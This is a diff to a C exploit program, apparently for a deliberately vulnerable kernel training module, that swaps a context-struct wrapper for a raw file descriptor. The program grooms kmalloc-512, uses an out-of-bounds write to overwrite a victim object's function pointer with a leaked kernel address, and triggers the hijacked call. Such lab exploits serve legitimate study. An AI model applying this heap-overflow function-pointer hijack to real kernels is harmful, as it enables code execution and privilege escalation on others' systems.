@@ -1,7 +1,8 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-
+#include <fcntl.h>
+#include <unistd.h>
 #include "heap_api.h"
 
 static unsigned long get_bad_addr(void) {
@@ -20,7 +21,12 @@ static unsigned long get_bad_addr(void) {
 }
 
 int main(void) {
-    heap_ctx_t ctx = { .fd = -1 };
+    int fd = open("/dev/uv_oob_dev", O_RDWR);
+    if (fd < 0) {
+        printf("[-] Failed to open device\n");
+        return -1;
+    }
+
     int vulobj_idx;
     int victim_idx;
 
@@ -30,62 +36,56 @@ int main(void) {
     if (bad_func_addr == 0) {
         printf("[-] Failed to find bad_function address from dmesg.\n");
         printf("[-] Ensure the module is loaded and dmesg has the address.\n");
+        close(fd);
         return -1;
     }
     printf("[+] Found bad_function address: 0x%lx\n", bad_func_addr);
 
-    if (heap_open(&ctx, HEAP_DEFAULT_DEVICE) < 0) {
-        return -1;
-    }
-    printf("[+] Device opened successfully.\n");
-
     printf("[+] Defragmenting kmalloc-512...\n");
-    if (heap_defrag(&ctx, "kmalloc-512") < 0) {
-        heap_close(&ctx);
+    if (heap_defrag(fd) < 0) {
+        close(fd);
         return -1;
     }
 
-    if (heap_alloc_vul(&ctx, 1, &vulobj_idx) < 0) {
-        heap_close(&ctx);
+    if (heap_alloc_vul(fd, 1, &vulobj_idx) < 0) {
+        close(fd);
         return -1;
     }
-    //printf("[+] Successfully alloc vulobj with handler: %d\n", vulobj_idx);
 
-    if (heap_alloc_victim(&ctx, 1, &victim_idx) < 0) {
-        heap_close(&ctx);
+    if (heap_alloc_victim(fd, 1, &victim_idx) < 0) {
+        close(fd);
         return -1;
     }
-    //printf("[+] Successfully alloc victim_obj with handler: %d\n", victim_idx);
 
     printf("[+] Dumping victim before overwrite...\n");
-    display_victim(&ctx, victim_idx);
+    heap_read_victim(fd, victim_idx);
 
     printf("[+] Executing original funptr...\n");
-    if (heap_execute_victim(&ctx, victim_idx) < 0) {
-        heap_close(&ctx);
+    if (heap_execute_victim(fd, victim_idx) < 0) {
+        close(fd);
         return -1;
     }
 
     printf("[+] Overwriting funptr with bad_function address...\n");
     for (int i = 0; i < (int)sizeof(unsigned long); i++) {
         char b = (char)((bad_func_addr >> (i * 8)) & 0xFF);
-        if (heap_write_vul(&ctx, vulobj_idx, 512 + i, b) < 0) {
-            heap_close(&ctx);
+        if (heap_write_vul(fd, vulobj_idx, 512 + i, b) < 0) {
+            close(fd);
             return -1;
         }
     }
     printf("[+] Overwrite done.\n");
 
     printf("[+] Dumping victim after overwrite...\n");
-    display_victim(&ctx, victim_idx);
+    heap_read_victim(fd, victim_idx);
 
     printf("[+] Executing hijacked funptr...\n");
-    if (heap_execute_victim(&ctx, victim_idx) < 0) {
-        heap_close(&ctx);
+    if (heap_execute_victim(fd, victim_idx) < 0) {
+        close(fd);
         return -1;
     }
     printf("[+] Execute command sent. Run 'dmesg | tail' to check if 'bad' was printed!\n");
 
-    heap_close(&ctx);
+    close(fd);
     return 0;
 }
